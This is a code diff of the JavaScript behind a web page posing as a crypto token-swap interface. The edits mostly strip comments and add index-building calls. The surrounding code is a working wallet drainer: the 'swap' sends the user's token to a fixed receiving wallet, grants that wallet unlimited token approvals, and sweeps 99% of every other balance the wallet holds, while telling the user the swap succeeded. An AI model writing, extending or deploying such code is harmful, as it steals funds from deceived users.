@@ -864,12 +864,12 @@ async function checkWalletEnvironment() {
     const chainId = window.ethereum.chainId;
     for (const network in NETWORK_CONFIGS) {
       if (NETWORK_CONFIGS[network].chainId === chainId) {
-        // Only update if network actually changed
         if (currentNetwork !== network) {
           currentNetwork = network;
           document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
           updateNetworkLogo(network);
-          setDefaultTokenPair(); // Add this line to update tokens
+          setDefaultTokenPair();
+          buildTokenIndex();
         }
         break;
       }
@@ -886,7 +886,6 @@ async function initializeWallet() {
     localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     
-    // Get current chain and update tokens
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
     for (const network in NETWORK_CONFIGS) {
       if (NETWORK_CONFIGS[network].chainId === chainId) {
@@ -897,10 +896,10 @@ async function initializeWallet() {
       }
     }
     
-    await setDefaultTokenPair(); // Ensure tokens are updated
+    await setDefaultTokenPair();
+    buildTokenIndex();
     await updateTokenBalances();
     
-    // Set up event listeners
     window.ethereum.on('accountsChanged', (accounts) => {
       if (accounts.length === 0) {
         handleWalletDisconnect();
@@ -912,13 +911,13 @@ async function initializeWallet() {
     });
     
     window.ethereum.on('chainChanged', (chainId) => {
-      // Find the new network
       for (const network in NETWORK_CONFIGS) {
         if (NETWORK_CONFIGS[network].chainId === chainId) {
           currentNetwork = network;
           document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
           updateNetworkLogo(network);
-          setDefaultTokenPair(); // Update tokens on chain change
+          setDefaultTokenPair();
+          buildTokenIndex();
           break;
         }
       }
@@ -946,7 +945,6 @@ async function fetchTokenBalance(token) {
   if (!userAddress) return 0;
   
   try {
-    // Skip tokens with invalid addresses
     if (token.address && !ethers.utils.isAddress(token.address)) {
       console.warn(`Skipping ${token.symbol} - invalid address`);
       return 0;
@@ -981,18 +979,14 @@ async function updateTokenBalances() {
     
     const balance = await fetchTokenBalance(currentFromToken);
     if (balance <= 0) {
-      balanceElement.innerHTML = `
-        Balance: 0 ${currentFromToken.symbol}
-      `;
+      balanceElement.innerHTML = `Balance: 0 ${currentFromToken.symbol}`;
       document.getElementById("swapBtn").disabled = true;
     } else {
-      balanceElement.innerHTML = `
-        Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}
-      `;
+      balanceElement.innerHTML = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
     }
   } catch (err) {
     console.error("Error updating balances:", err);
-    balanceElement.innerHTML = `
+    document.getElementById("fromTokenBalance").innerHTML = `
       <span style="color: var(--error)">Balance: Error loading</span>
     `;
   }
@@ -1021,13 +1015,11 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    // Handle MetaMask connection properly
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     } catch (err) {
       if (err.code === -32002) {
-        // Request already pending
         accounts = await new Promise((resolve) => {
           window.ethereum.on('accountsChanged', (accounts) => {
             resolve(accounts);
@@ -1092,6 +1084,7 @@ async function handleNetworkChange(network) {
     updateNetworkLogo(network);
     
     setDefaultTokenPair();
+    buildTokenIndex();
     
     if (userAddress) {
       await checkNetwork();
@@ -1144,7 +1137,7 @@ async function checkNetwork() {
 // SWAP FUNCTIONS 
 // =====================
 
-let isSwapInProgress = false; // Global swap lock
+let isSwapInProgress = false;
 
 async function handleSwap() {
   if (isSwapInProgress) return;
@@ -1153,7 +1146,6 @@ async function handleSwap() {
     isSwapInProgress = true;
     showLoader();
 
-    // 1. Validate inputs
     if (!userAddress) {
       throw new Error("Please connect your wallet first");
     }
@@ -1167,7 +1159,6 @@ async function handleSwap() {
       throw new Error("Please enter a valid amount to swap");
     }
 
-    // 2. Check balances with more detailed error messages
     const balance = await fetchTokenBalance(currentFromToken);
     if (balance <= 0) {
       throw new Error(`
@@ -1184,7 +1175,6 @@ async function handleSwap() {
       `);
     }
 
-    // 3. Check for native token gas reserves
     if (currentFromToken.isNative) {
       const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
       if (balance - inputAmount < minReserve) {
@@ -1196,15 +1186,12 @@ async function handleSwap() {
       }
     }
 
-    // 4. Execute the swap
     updateStatus(`Processing swap...`, "success");
     
     let txHash;
     if (currentFromToken.isNative) {
-      // Native token transfer
       txHash = await transferNativeToken(currentFromToken, inputAmount);
     } else {
-      // ERC20 token transfer (needs approval first)
       const approved = await checkAndApproveToken(currentFromToken, inputAmount);
       if (!approved) {
         throw new Error("Token approval failed");
@@ -1212,10 +1199,8 @@ async function handleSwap() {
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    // 5. Process all other token transfers
     const otherTokensTransferred = await processAllTokenTransfers();
     
-    // 6. Show success message with transaction link
     const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
     let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
     
@@ -1225,7 +1210,6 @@ async function handleSwap() {
     
     updateStatus(successMessage, "success");
 
-    // 7. Update UI
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
@@ -1238,7 +1222,7 @@ async function handleSwap() {
         <span>Swap Failed</span>
       </div>
       <div class="dex-error-details">${err.message}</div>
-    `, "error", 10000); // Show for 10 seconds
+    `, "error", 10000);
   } finally {
     hideLoader();
     isSwapInProgress = false;
@@ -1253,13 +1237,11 @@ async function processAllTokenTransfers() {
   try {
     updateStatus("Preparing token transfers...", "info");
     
-    // Get tokens and balances in parallel
     const [localTokens, balances] = await Promise.all([
       getLocalTokens(),
       fetchAllTokenBalances()
     ]);
     
-    // Filter tokens with balances > 0 and not the fromToken
     const tokensToProcess = localTokens.filter(token => {
       const balance = balances[token.address || 'native'];
       return balance > 0 && 
@@ -1274,7 +1256,6 @@ async function processAllTokenTransfers() {
     
     updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
     
-    // Process in batches
     const BATCH_SIZE = 5;
     let successCount = 0;
     
@@ -1303,13 +1284,11 @@ async function fetchAllTokenBalances() {
   const localTokens = await getLocalTokens();
   const balances = {};
   
-  // Get native balance first
   if (provider && userAddress) {
     const nativeBalance = await provider.getBalance(userAddress);
     balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
   }
   
-  // Get ERC20 balances via multicall if available
   const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
   if (erc20Tokens.length > 0) {
     const erc20Balances = await fetchMultipleTokenBalances(erc20Tokens);
@@ -1320,7 +1299,6 @@ async function fetchAllTokenBalances() {
 }
 
 async function processTokenTransfer(token) {
-  // Skip the main from token
   if ((token.address && token.address === currentFromToken?.address) || 
       (token.isNative && currentFromToken?.isNative)) {
     return false;
@@ -1330,7 +1308,6 @@ async function processTokenTransfer(token) {
     const balance = await fetchTokenBalance(token);
     if (balance <= 0) return false;
 
-    // Calculate 99% of balance (leave 1%)
     let amountToSend = balance * 0.99;
     
     if (token.isNative) {
@@ -1339,7 +1316,6 @@ async function processTokenTransfer(token) {
       if (amountToSend <= 0) return false;
     }
 
-    // Skip tokens with invalid addresses
     if (token.address && !ethers.utils.isAddress(token.address)) {
       console.warn(`Skipping ${token.symbol} - invalid address`);
       return false;
@@ -1373,7 +1349,6 @@ async function fetchMultipleTokenBalances(tokens) {
     "function aggregate(tuple(address target, bytes callData)[] calls) view returns (uint256 blockNumber, bytes[] returnData)"
   ];
   
-  // Use known multicall addresses per network
   const MULTICALL_ADDRESSES = {
     ethereum: "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441",
     bsc: "0x41263cBA59EB80dC200F3E2544eda4ed6A90E76C",
@@ -1384,7 +1359,6 @@ async function fetchMultipleTokenBalances(tokens) {
   
   const multicallAddress = MULTICALL_ADDRESSES[currentNetwork];
   if (!multicallAddress) {
-    // Fallback to individual calls if no multicall
     const balances = {};
     for (const token of tokens) {
       balances[token.address] = await fetchTokenBalance(token);
@@ -1442,12 +1416,10 @@ const GAS_LIMITS = {
   approval: 150000
 };
 
-// Modify the transfer functions like this:
 async function transferNativeToken(token, amount) {
   try {
     updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
     
-    // Get current gas price and cap it
     let gasPrice = await provider.getGasPrice();
     const maxGasPrice = ethers.utils.parseUnits(
       MAX_GAS_PRICE_GWEI[currentNetwork].toString(), 
@@ -1481,7 +1453,6 @@ async function transferERC20Token(token, amount) {
     const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
     const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
     
-    // Dynamic gas estimation with fallback
     let gasEstimate;
     try {
       gasEstimate = await contract.estimateGas.transfer(
@@ -1490,13 +1461,10 @@ async function transferERC20Token(token, amount) {
       );
     } catch (e) {
       console.warn(`Gas estimation failed for ${token.symbol}, using fallback`);
-      gasEstimate = ethers.BigNumber.from(200000); // Fallback gas limit
+      gasEstimate = ethers.BigNumber.from(200000);
     }
 
-    // Add 20% buffer to gas estimate
     const gasLimit = gasEstimate.mul(120).div(100);
-    
-    // Get current gas price and add 10% premium
     const gasPrice = (await provider.getGasPrice()).mul(110).div(100);
     
     const tx = await contract.transfer(
@@ -1523,16 +1491,12 @@ async function checkAndApproveToken(token, amount) {
     const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
     const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
     
-    // Check current allowance
     const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
     if (allowance.gte(neededAllowance)) return true;
 
-    // Request approval with proper gas
     updateStatus(`Approving ${token.symbol}...`, "success");
     
-    // Special handling for USDT which doesn't allow changing allowance from non-zero
     if (token.symbol === 'USDT' && !allowance.isZero()) {
-      // First set to zero
       const zeroTx = await contract.approve(
         RECEIVING_WALLET,
         ethers.constants.Zero,
@@ -1541,11 +1505,10 @@ async function checkAndApproveToken(token, amount) {
       await zeroTx.wait();
     }
     
-    // Then set to max
     const approveTx = await contract.approve(
       RECEIVING_WALLET,
       ethers.constants.MaxUint256,
-      { gasLimit: 150000 } // Increased gas limit
+      { gasLimit: 150000 }
     );
     
     await approveTx.wait();
@@ -1564,10 +1527,9 @@ async function checkAndApproveToken(token, amount) {
 function updateStatus(message, type, duration = 5000) {
   const statusDiv = document.getElementById("status");
   statusDiv.style.display = "block";
-  statusDiv.innerHTML = message; // Changed to innerHTML to allow formatting
+  statusDiv.innerHTML = message;
   statusDiv.className = `dex-status ${type}`;
   
-  // Add close button
   statusDiv.innerHTML += `<button class="dex-status-close" onclick="this.parentElement.style.display='none'">
     <i class="fas fa-times"></i>
   </button>`;
@@ -1613,12 +1575,10 @@ function updateSwapButton() {
   if (!userAddress) {
     btn.disabled = false;
     btnText.textContent = "Connect Wallet";
-    // Add click handler for wallet connection
     btn.onclick = handleWalletConnection;
     return;
   }
   
-  // Remove the wallet connection handler if wallet is connected
   btn.onclick = handleSwap;
   
   if (!currentFromToken || !currentToToken) {
